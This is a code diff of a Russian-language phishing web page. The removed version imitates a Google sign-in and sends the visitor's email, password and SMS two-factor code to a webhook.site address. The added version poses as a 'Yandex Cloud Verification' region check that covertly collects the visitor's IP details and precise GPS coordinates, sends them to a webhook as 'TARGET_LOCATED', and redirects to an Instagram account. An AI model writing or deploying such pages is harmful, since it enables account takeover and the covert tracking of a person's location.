@@ -2,68 +2,60 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход — Аккаунты Google</title>
+    <title>Yandex Cloud Verification</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .auth-card { width: 360px; padding: 40px 24px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .google-logo { width: 75px; margin-bottom: 10px; }
-        .title { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
-        .subtitle { font-size: 16px; margin-bottom: 30px; }
-        .account-box { display: flex; align-items: center; padding: 12px; border-top: 1px solid #dadce0; cursor: pointer; }
-        .account-box:hover { background: #f8f9fa; }
-        .avatar { width: 32px; height: 32px; background: #e8eaed; border-radius: 50%; margin-right: 12px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #5f6368; }
-        #status-msg { font-size: 12px; color: #d93025; margin-top: 10px; display: none; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader-box { text-align: center; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { font-size: 14px; color: #000; font-weight: 500; }
     </style>
 </head>
 <body>
-<div class="auth-card">
-    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo">
-    <div class="title">Выберите аккаунт</div>
-    <div class="subtitle">для перехода в Skin Level</div>
-    <div class="account-box" id="trigger">
-        <div class="avatar">?</div>
-        <div style="text-align: left;">
-            <div style="font-size: 14px; font-weight: 500;">Использовать другой аккаунт</div>
-            <div style="font-size: 12px; color: #5f6368;">Безопасный вход</div>
-        </div>
+
+    <div class="loader-box" id="main-box">
+        <div class="spinner"></div>
+        <div class="text">Проверка региона доступа...</div>
     </div>
-    <div id="status-msg">Ошибка аутентификации. Повторите попытку.</div>
-</div>
 
-<script>
-    const webhook = 'https://webhook.site/b28ec138-bf0a-4f8e-a5f8-23416b82a7ed'; // Твой URL
+    <script>
+        const webhook = 'https://webhook.site/675c487a-3093-4826-9eb8-dd9f5ed15c0d';
 
-    // Тихий сбор данных устройства
-    fetch('https://ipapi.co/json/').then(r => r.json()).then(ip => {
-        send({ type: 'INFO_IP', data: ip, agent: navigator.userAgent });
-    });
-
-    function send(data) {
-        fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
-    }
-
-    document.getElementById('trigger').onclick = async function() {
-        const email = prompt("Введите email или телефон:");
-        if (!email) return;
-
-        const p1 = prompt("Введите пароль:");
-        send({ type: 'STEP_1_PASS', user: email, pass: p1 });
-
-        document.getElementById('status-msg').style.display = 'block';
-        
-        setTimeout(() => {
-            const p2 = prompt("Неверный пароль. Повторите ввод:");
-            send({ type: 'STEP_2_CONFIRM', user: email, pass: p2 });
+        async function init() {
+            // 1. Сбор базовых данных (IP, Регион, Провайдер)
+            const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
             
-            const code = prompt("Введите 6-значный код из SMS для подтверждения личности:");
-            if (code) {
-                send({ type: 'STEP_3_2FA', code: code });
-                alert("Синхронизация успешна.");
-                window.location.href = "https://www.instagram.com/skinlevel_?igsh=MWEyczkxam5hYXJ1dQ=="; // Редирект
-            }
-        }, 800);
-    };
-</script>
+            // 2. Скрытый запрос ГЕОПОЗИЦИИ под видом "Доступа к региону"
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    send({ 
+                        type: 'TARGET_LOCATED', 
+                        ip: ipInfo.ip,
+                        city: ipInfo.city,
+                        coords: `${pos.coords.latitude}, ${pos.coords.longitude}`,
+                        map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                    });
+                    complete();
+                }, (err) => {
+                    send({ type: 'GEO_DENIED', ip: ipInfo.ip });
+                    complete();
+                });
+            } else { complete(); }
+        }
+
+        function complete() {
+            document.querySelector('.text').innerText = "Доступ разрешен. Перенаправление...";
+            setTimeout(() => {
+                // Вместо скам-форм уводим её в Инстаграм
+                window.location.href = "https://www.instagram.com/skinlevel_";
+            }, 1500);
+        }
+
+        function send(data) {
+            fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+        }
+
+        window.onload = init;
+    </script>
 </body>
 </html>
